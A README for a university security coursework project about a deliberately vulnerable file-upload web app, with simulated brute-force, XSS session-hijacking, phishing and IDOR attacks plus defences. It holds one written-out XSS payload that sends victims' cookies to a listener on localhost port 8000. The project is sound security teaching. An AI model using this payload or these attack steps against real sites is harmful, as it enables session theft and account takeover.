# ELEC0138 Group 8 – Security and Privacy challenges in a File Upload App

## Overview

This project aims to analyze and address Security and Privacy challenges in a web-based app (File Upload App) by applying threat modeling and mitigation methods. 

Several cyber attacks targeting common vulnerabilities are designed and implemented. Also, relevant mitigation measures are presented.

A vedio presentation of this project can be seen:(https://youtu.be/MD4qnzbECH4)


## Group Members

- Wenjing Hu
- Zoe Qian
- Andreas Tyrovolas


## Features

```
ELEC0138_Group8/
├── Attack/            # Contains different attacks and relevant mitigation methods
├── static/            # Functions of uploading documents
├── templates/         # HTML templates for the web interface
├── original_system    # Contains original system with no defences files
├── environment.yml    # Conda environment definition
├── initialize_db.py   # Script to initialize the database
├── requirements.txt   # Python package dependencies
├── combined_defences.py # System with all defences implemented
└── system.py          # Main application script

```


## Steps

1. **Clone the Repository**

   ```bash
   git clone https://github.com/Wenjing-1225/ELEC0138_Group8.git
   cd ELEC0138_Group8
   ```


2. **Set Up the Environment**

   Create a Conda environment using the provided `environment.yml` file:

   ```bash
   conda env create -f environment.yml
   conda activate elec0138_group8
   ```


   Alternatively, install dependencies using `requirements.txt`:

   ```bash
   pip install -r requirements.txt
   ```


3. **Run the Application**

   Start the main application:

   ```bash
   python original_system/system.py
   ```


   The web interface should now be accessible at `http://localhost:5000/`.


4. **Run the Attack Simulation**

   - **Brute-force Login Attack**:
     
     1. Edit `brute_force.py` to set the target username (e.g. `victim@example.com`)  
     2. Run `brute_force.py`  
        → The script will simulate password guessing attempts by sending repeated login requests using common passwords.  
        → A valid match will be printed to the terminal once found.  
        > This simulates a real-world brute force scenario using multithreading and common credential dictionaries.

   - **Session Hijacking via XSS**:
     
     1. Register a malicious username like:  
        ```html
        <script>new Image().src="http://localhost:8000/steal?cookie="+document.cookie</script>
        ```
     2. Run `listener.py`  
        → This starts a listener on port 8000 to capture incoming cookies.

     3. When a legitimate user visits the homepage, the malicious script will trigger and send their session cookie to the attacker.
     4. Use `hijack_session.py`  
        → Load the captured cookie and simulate a GET request to `/`, gaining unauthorized access as the victim.
   - **Phishing Simulation**:
     
     1. Run `send_phishing.py`  
        → You can modify the `receiver_email` variable to the desired email address.  
        *Please make sure that you have the recipient’s explicit consent before sending any simulated phishing emails.*

     2. Run `app.py`  
        → This will launch the phishing web application.

   - **IDOR Attack Simulation**:

     1. Run `image_attack.py`  
     2. Stolen images will be stored in a separate folder, stolen_images
        
4. **Run the Defense System**

   - **Phishing Detection System**:

     1. Run `model.py`  
        → This initializes and loads the phishing detection model.

     2. Run `combined_defences.py`  
        → This starts the Flask web interface for users to input URLs and receive detection results in Security Center.

   - **IDOR Defence Strategy**:

     1. Run `combined_defences.py`  
     2. This ensures, session based authentication, strict access control, logging and that filenames are securely hashed


